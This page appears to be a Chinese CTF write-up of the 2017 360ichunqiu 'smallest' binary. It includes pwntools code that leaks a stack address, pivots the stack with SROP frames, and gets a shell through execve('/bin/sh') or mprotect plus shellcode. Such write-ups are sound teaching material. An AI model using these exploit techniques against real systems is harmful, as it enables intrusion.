@@ -1,0 +1,355 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="1.常规checksec，开了一个NX，没办法shellcode。IDA打开查看程序，找漏洞，有个屁的漏洞，只有一个syscall的系统调用，各种栈操作也没有。 2.观察这个系统调用，系统调用参数通过edx,rsi,rdi赋值，edx直接被赋值为400h，buf对应的rsi被rsp赋值，系统调用号fd对应的rdi被rax赋值。再查看汇编代码，有xor rax,rax，所以rax一定是0，那么这个s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="360ichunqiu 2017-smallest">
+<meta property="og:url" content="http://pig-007.github.io/2021/08/14/360ichunqiu%202017-smallest/index.html">
+<meta property="og:site_name" content="PIG-007">
+<meta property="og:description" content="1.常规checksec，开了一个NX，没办法shellcode。IDA打开查看程序，找漏洞，有个屁的漏洞，只有一个syscall的系统调用，各种栈操作也没有。 2.观察这个系统调用，系统调用参数通过edx,rsi,rdi赋值，edx直接被赋值为400h，buf对应的rsi被rsp赋值，系统调用号fd对应的rdi被rax赋值。再查看汇编代码，有xor rax,rax，所以rax一定是0，那么这个s">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527242.jpeg">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527471.jpeg">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527913.jpeg">
+<meta property="article:published_time" content="2021-08-14T05:40:30.000Z">
+<meta property="article:modified_time" content="2021-08-19T07:27:27.195Z">
+<meta property="article:author" content="PIG-007">
+<meta property="article:tag" content="SROP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527242.jpeg"><title>360ichunqiu 2017-smallest | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2021/08/14/360ichunqiu%202017-smallest/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">360ichunqiu 2017-smallest</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><p>1.常规checksec，开了一个NX，没办法shellcode。IDA打开查看程序，找漏洞，有个屁的漏洞，只有一个syscall的系统调用，各种栈操作也没有。</p>
+<p>2.观察这个系统调用，系统调用参数通过edx,rsi,rdi赋值，edx直接被赋值为400h，buf对应的rsi被rsp赋值，系统调用号fd对应的rdi被rax赋值。再查看汇编代码，有xor rax,rax，所以rax一定是0，那么这个syscall系统调用的就是read函数，读取的数取直接存入栈顶。由于buf大小为400h，且只有一个syscall，之后直接retn，没有leave指令，这就代表了rsp指向的地址就是我们执行完syscall后start函数retn的返回地址(pop eip)。也就是如果输入一个地址，读取完之后，通过retn就会跳转到该地址中。另外程序中除了retn之外没有其它对栈帧进行操作的指令，如果输入多个syscall地址，就可以反复执行syscall。并且最开始输入400h字节，程序流完全可控。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527242.jpeg" alt="img"></p>
+<p>3.首先想到rop，但是题目没给Libc，并且通过调试发现，这个程序压根就没导入外部的Libc库，IDA中打开没有extern，完全没办法常规rop，那么想用SROP。远程调试一下查看堆栈数据，发现临时创建的smallest段数据没有可写权限，能够利用的只有[stack]栈数据。所以这里需要先泄露一个栈地址来让我们能够往栈中写入数据binsh从而调用execve(‘/bin/sh\x00’，0，0)来直接getshell。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527471.jpeg" alt="img"></p>
+<p>4.之后观察栈上的数据，发现当运行到syscall时，rsp下方的内容全是栈上的地址。<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527913.jpeg" alt="img"></p>
+<p>rbp一直都是0x000……这是因为程序只有一个start函数，根本就没有为函数再次创建栈，所用的只是最初生成的栈空间。根据这个原理，我们可以通过系统调用sys_write函数，来打印rsp指向的内容，也就是某个栈地址，这样就成功泄露栈地址。</p>
+<p>5.但是sys_write的调用号是1，而通过调试发现rax的初始值被默认设置为0，并且程序中没有任何修改rax的代码。唯一一个也只有xor   rax, rax，但是任何数和本身异或的结果都是0，所以如果程序每次都从这行代码执行，那么执行的系统调用号永远都是0，也就是会无限循环read。这里想到由于栈完全可控，并且输入一个地址，程序执行完这个地址对应的函数后retn会直接跳转到rsp的下一行。这里选择让程序再执行一次sys_read函数，之后我们为其中一次输入一个字节，并且这次返回不再从xor这行代码开始执行，从mov rsi, rsp开始。由于sys_read的返回值自动写回给rax(一般函数的返回值都会写给rax)，所以读取几个字节read就向rax写入多少，这样就会使得rax也可以得到控制，不再被xor为0，调用我们想调用的系统函数。</p>
+<p>6.所以编写payload:先尝试一下看能否泄露栈地址，test1.py</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">payload += p64(set_rsi_rdi_addr)</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">#泄露栈地址之后返回到start，执行下一步操作。</span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(3)</span><br><span class="line">io.send(payload[8:8+1])</span><br></pre></td></tr></table></div></figure>
+
+<p>#利用sys_read随便读取一个字符，设置rax = 1，由于retn关系，rsp下拉了一个单位，所以这里会读入到原先的rsp+0x8处，也就是从原先的Payload中第8个字符开始，抽取一个字符，就是set_rsi_rdi_addr的最后一个字节，为了不改变返回地址。如果写成：io.send(‘\xb8’)效果一样，都是为了不改变返回地址。之后再执行set_rsi_rdi_addr从而执行write函数，</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">stack_addr = u64(io.recv()[8:16]) + 0x100</span><br><span class="line">#从最初的rsp+0x10开始打印400字节数据，那么从泄露的数据中抽取栈地址，+0x100防止栈数据过近覆盖</span><br><span class="line">log.info(&#x27;stack addr = %#x&#x27; %(stack_addr))</span><br></pre></td></tr></table></div></figure>
+
+<p>7.这里可以看到成功泄露了一个栈地址，但是不能再用简单读入binsh字符串之后设置SigreturnFrame结构体来getshell，因为这里设置读入地址是通过rsp设置的。如果将rsp设置为我们想读入binsh的栈地址，那么肯定是可以读入binsh字符串的，但是当程序运行到retn时，跳转的是binsh这个地址，这是不合法的，没办法跳转，程序会崩溃。</p>
+<p>这里就考虑使用SigreturnFrame()来进行栈劫持，将整个栈挪移到目的地。</p>
+<p>(1)首先布置SigreturnFrame()的栈空间，进行栈劫持：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">frame_read = SigreturnFrame() </span><br><span class="line">#设置read的SROP帧，不使用原先的read是因为可以使用SROP同时修改rsp，实现stack pivot</span><br><span class="line">frame_read.rax = constants.SYS_read#调用read读取payload2</span><br><span class="line">frame_read.rdi = 0#fd参数</span><br><span class="line">frame_read.rsi = stack_addr#读取payload2到rsi处</span><br><span class="line">frame_read.rdx = 0x300#读取长度为0x300</span><br><span class="line">#读取的大小</span><br><span class="line">frame_read.rsp = stack_addr#设置SROP执行完的rsp位置</span><br><span class="line">#设置执行SROP之后的rsp为stack_addr，里面存的是start_addr，retn指令执行后从start开始。</span><br><span class="line">frame_read.rip = syscall_addr#设置SROP中的一段代码指令</span><br></pre></td></tr></table></div></figure>
+
+<p>(2)发送payload。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload1 = &quot;&quot;</span><br><span class="line">payload1 += p64(start_addr)#读取payload[8:8+15]，设置rax=0xf0</span><br><span class="line">payload1 += p64(syscall_addr)#利用rax=0xf0,调用SROP</span><br><span class="line">payload1 += str(frame_read)</span><br><span class="line">io.send(payload1)</span><br><span class="line">sleep(3)</span><br><span class="line">io.send(payload1[8:8+15])</span><br><span class="line">#为rax赋值为0xf0</span><br><span class="line">sleep(3)</span><br></pre></td></tr></table></div></figure>
+
+<p>程序运行SROP过程中，会执行read函数，将payload2读取到stack_addr处，所以当程序运行完SROP后，栈顶rsp被劫持到stack_addr处，同时stack_addr上保存的内容是payload2，首地址是start，所以retn执行后仍旧从start开始。</p>
+<p>(3)设置第二次的SigreturnFrame攻击：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">frame_execve = SigreturnFrame()</span><br><span class="line">#设置execve的SROP帧，注意计算/bin/sh\x00所在地址</span><br><span class="line">frame_execve.rax = constants.SYS_execve</span><br><span class="line">frame_execve.rdi = stack_addr+0x108</span><br><span class="line">frame_execve.rip = syscall_addr</span><br></pre></td></tr></table></div></figure>
+
+<p>这里的0x108是计算出来的，需要计算从stack_addr到rdi，也就是binsh字符串的距离。由于传进去的是结构体，大小为0xf8。前一个例子中binsh字符串是放在str(frameExecve)之前，所以没有那么大。这里却是放在str(frame_execve)之后，所以从stack_addr为起始，start_addr，syscall_addr，frame_execve)，总共为0xf8+0x08*2=0x108，这里不太懂可以调试一下看看。也就是再一次start_addr读取字符串binsh的位置。</p>
+<p>8.发送payload，读取binsh字符串，getshell：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload2 = &quot;&quot;</span><br><span class="line">payload2 += p64(start_addr)#处在stack_addr处，读取payload[8:8+15]，设置rax=0xf0</span><br><span class="line">payload2 += p64(syscall_addr)#处在stack_addr+0x08,利用rax=0xf0,调用SROP</span><br><span class="line">payload2 += str(frame_execve)#处在stack_addr+0x10</span><br><span class="line">payload2 += &quot;/bin/sh\x00&quot;#处在stack+0x108处</span><br><span class="line">io.send(payload2)</span><br><span class="line">sleep(3)</span><br><span class="line">io.send(payload2[8:8+15])</span><br><span class="line">sleep(3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+<p>9.尝试使用mprotect为栈内存添加可执行权限x，从而shellcode来getshell。</p>
+<p>(1)第一段的劫持栈和读取payload2进入劫持栈处都是一样的</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">frame_read = SigreturnFrame()#设置read的SROP帧</span><br><span class="line">frame_read.rax = constants.SYS_read</span><br><span class="line">frame_read.rdi = 0</span><br><span class="line">frame_read.rsi = stack_addr</span><br><span class="line">frame_read.rdx = 0x300</span><br><span class="line">frame_read.rsp = stack_addr</span><br><span class="line">#读取payload2，这个stack_addr地址中的内容就是start地址，SROP执行完后ret跳转到start</span><br><span class="line">frame_read.rip = syscall_addr</span><br></pre></td></tr></table></div></figure>
+
+<p>(2)第二段需要调用mprotect来修改权限：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">frame_mprotect = SigreturnFrame()</span><br><span class="line">#设置mprotect的SROP帧，用mprotect修改栈内存为RWX</span><br><span class="line">frame_mprotect.rax = constants.SYS_mprotect</span><br><span class="line">frame_mprotect.rdi = stack_addr &amp; 0xFFFFFFFFFFFFF000</span><br><span class="line">frame_mprotect.rsi = 0x1000</span><br><span class="line">frame_mprotect.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC</span><br><span class="line">#权限为R,W,X</span><br><span class="line">frame_mprotect.rsp = stack_addr</span><br><span class="line">#劫持栈地址rsp</span><br><span class="line">frame_mprotect.rip = syscall_addr</span><br></pre></td></tr></table></div></figure>
+
+<p>(3)最后的shellcode:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload2 = &quot;&quot;</span><br><span class="line">payload2 += p64(stack_addr+0x10) #处在stack_addr</span><br><span class="line">#SROP执行完后，ret到stack_addr+0x10处的代码，即执行shellcode</span><br><span class="line">payload2 += asm(shellcraft.amd64.linux.sh())#处在stack_addr+0x10</span><br><span class="line">io.send(payload2)</span><br><span class="line">sleep(3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+<p>参考资料：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2021/08/14/360ichunqiu%202017-smallest/">http://pig-007.github.io/2021/08/14/360ichunqiu%202017-smallest/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/SROP/">SROP</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2021/08/14/2021-QWB/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">2021-QWB</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/08/14/Alictf%202016-vss/"><span class="paginator-prev__text">pwnable.kr-login</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">93</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">40</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">43</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ Untitled ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
